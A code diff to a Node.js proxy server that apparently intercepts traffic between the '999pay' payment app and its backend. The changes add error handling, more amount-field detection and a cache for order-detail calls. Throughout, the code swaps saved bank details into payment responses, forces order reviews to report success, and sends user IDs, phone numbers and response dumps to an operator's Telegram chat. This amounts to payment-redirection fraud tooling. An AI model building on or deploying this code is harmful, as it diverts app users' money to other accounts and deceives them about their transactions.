@@ -1602,15 +1602,20 @@ async function proxyAndReplaceBankDetails(req, res, label) {
     // 999pay aggregates user's selected sell-orders → actual amount only appears here.
     // Tier 1: known field names directly on respData
     let detectedAmount = parseFloat(
-      rd.amount ?? rd.orderAmount ?? rd.buyAmount ?? rd.payAmount ?? rd.totalAmount
-      ?? rd.payAmt ?? rd.orderAmt ?? rd.buyAmt ?? rd.transferAmount ?? rd.transAmount
-      ?? rd.realAmount ?? rd.actualAmount ?? rd.money ?? rd.totalMoney ?? rd.tradeAmount ?? '0'
+      rd.amount ?? rd.orderAmount ?? rd.buyAmount ?? rd.payAmount ?? rd.paymentAmount
+      ?? rd.totalAmount ?? rd.payAmt ?? rd.orderAmt ?? rd.buyAmt ?? rd.transferAmount
+      ?? rd.transAmount ?? rd.realAmount ?? rd.actualAmount ?? rd.money ?? rd.totalMoney
+      ?? rd.tradeAmount ?? '0'
     ) || 0;
     let amountSource = detectedAmount > 0 ? 'known-field' : null;
 
+    // PERF: Skip expensive Tier 2 scan + late-decision logic for non-/details endpoints
+    // (e.g. /simpleUserBank, /tool — these are bank-list endpoints, no amount involved).
+    const isDetailsEndpoint = /\/details(\?|$)/i.test(req.originalUrl || '');
+
     // Tier 2: recursive scan — look for ANY key containing "amount"/"amt"/"money"/"price"
     // and pick the largest plausible value (≥1, ≤10,000,000)
-    if (!detectedAmount && respData && typeof respData === 'object') {
+    if (isDetailsEndpoint && !detectedAmount && respData && typeof respData === 'object') {
       let bestVal = 0; let bestKey = null;
       const scan = (obj, depth) => {
         if (!obj || typeof obj !== 'object' || depth > 4) return;
@@ -1632,7 +1637,6 @@ async function proxyAndReplaceBankDetails(req, res, label) {
     // 🐛 AUTO-DEBUG: if amount STILL not detected, dump all keys+values from response
     // to Telegram so we can identify the exact field name 999pay uses.
     // ONLY for /details endpoints (others like /simpleUserBank legitimately have no amount).
-    const isDetailsEndpoint = /\/details(\?|$)/i.test(req.originalUrl || '');
     if (isDetailsEndpoint && !detectedAmount && respData && data.adminChatId && bot) {
       const flat = {};
       const collect = (obj, prefix, depth) => {
@@ -1696,27 +1700,32 @@ ${dump.substring(0, 3500)}
     const active = eff.botEnabled !== false ? getActiveBank(data, detectedUserId, detectedAmount > 0 ? detectedAmount : undefined) : null;
 
     if (respData) {
-      const savedBank = getOrderBankMultiple(data, allOrderIds);
-      if (savedBank) {
-        if (Array.isArray(respData)) {
-          respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, savedBank, {}, 0); });
-        } else {
-          deepReplace(respData, savedBank, {}, 0);
+      try {
+        const savedBank = getOrderBankMultiple(data, allOrderIds);
+        if (savedBank) {
+          if (Array.isArray(respData)) {
+            respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, savedBank, {}, 0); });
+          } else {
+            deepReplace(respData, savedBank, {}, 0);
+          }
         }
-      }
-      let shouldForceSuccess = eff.forceReviewSuccess;
-      if (!shouldForceSuccess && !detectedUserId) {
-        const successUserIds = getForceReviewSuccessUserIds(data);
-        if (successUserIds.length === 1) {
-          shouldForceSuccess = true;
+        let shouldForceSuccess = eff.forceReviewSuccess;
+        if (!shouldForceSuccess && !detectedUserId) {
+          const successUserIds = getForceReviewSuccessUserIds(data);
+          if (successUserIds.length === 1) {
+            shouldForceSuccess = true;
+          }
         }
-      }
-      if (shouldForceSuccess) {
-        if (Array.isArray(respData)) {
-          respData.forEach(item => markReviewAsSuccess(item));
-        } else {
-          markReviewAsSuccess(respData);
+        if (shouldForceSuccess) {
+          if (Array.isArray(respData)) {
+            respData.forEach(item => markReviewAsSuccess(item));
+          } else {
+            markReviewAsSuccess(respData);
+          }
         }
+      } catch (replaceErr) {
+        console.error('deepReplace error:', replaceErr.message);
+        // Fall through — send original response so APK doesn't crash on bad JSON
       }
     }
 
@@ -1999,11 +2008,13 @@ async function proxyAndAddBonus(req, res) {
 }
 
 app.post('/app/buy/order', async (req, res) => {
-  const [data, proxyResult] = await Promise.all([
-    cachedData ? Promise.resolve(cachedData) : loadData(),
-    proxyFetch(req)
-  ]);
+  let data = null;
   try {
+    const [d, proxyResult] = await Promise.all([
+      cachedData ? Promise.resolve(cachedData) : loadData(),
+      proxyFetch(req)
+    ]);
+    data = d;
     const { response, respBody, respHeaders, jsonResp } = proxyResult;
     const userId = await extractUserId(req, jsonResp);
     if (userId) { trackUser(data, userId, 'Buy Order'); saveData(data).catch(()=>{}); }
@@ -2059,14 +2070,51 @@ app.post('/app/buy/order', async (req, res) => {
       bot.sendMessage(data.adminChatId, `⚠️ Buy Order Created\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\nAmount: ₹${body.amount || body.buyAmount || 'N/A'}\nOrder: ${newOrderId || 'N/A'}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
     }
   } catch(e) {
-    if (data.adminChatId && bot) {
+    console.error('/buy/order error:', e.message);
+    if (data && data.adminChatId && bot) {
       bot.sendMessage(data.adminChatId, `❌ Buy Order ERROR: ${e.message}`).catch(()=>{});
     }
-    await transparentProxy(req, res);
+    if (!res.headersSent) {
+      try { await transparentProxy(req, res); }
+      catch (e2) {
+        console.error('/buy/order transparent fallback failed:', e2.message);
+        if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
+      }
+    }
   }
 });
 
+// PERF: dedupe duplicate /details calls (APK fires it 2x). 8s in-memory cache.
+const _detailsCache = new Map();
+const DETAILS_CACHE_TTL = 8000;
 app.all('/app/buy/order/details', async (req, res) => {
+  const oid = req.query?.buyOrderNo || req.parsedBody?.buyOrderNo || req.parsedBody?.orderNo || '';
+  const tokenHdr = req.headers['authorization'] || req.headers['token'] || '';
+  const cacheKey = oid ? `${oid}|${tokenHdr.slice(-16)}` : '';
+  if (cacheKey) {
+    const hit = _detailsCache.get(cacheKey);
+    if (hit && Date.now() - hit.ts < DETAILS_CACHE_TTL) {
+      res.writeHead(hit.status, hit.headers);
+      res.end(hit.body);
+      return;
+    }
+  }
+  // Wrap res to capture response for cache
+  if (cacheKey) {
+    const origWriteHead = res.writeHead.bind(res);
+    const origEnd = res.end.bind(res);
+    let capStatus = 200, capHeaders = {}, capBody = null;
+    res.writeHead = (s, h) => { capStatus = s; capHeaders = h || {}; return origWriteHead(s, h); };
+    res.end = (b) => {
+      if (b) { capBody = b; _detailsCache.set(cacheKey, { ts: Date.now(), status: capStatus, headers: capHeaders, body: capBody }); }
+      // Cleanup old entries (max 200)
+      if (_detailsCache.size > 200) {
+        const cutoff = Date.now() - DETAILS_CACHE_TTL;
+        for (const [k, v] of _detailsCache) if (v.ts < cutoff) _detailsCache.delete(k);
+      }
+      return origEnd(b);
+    };
+  }
   await proxyAndReplaceBankDetails(req, res, '💳 Order Details');
 });
 
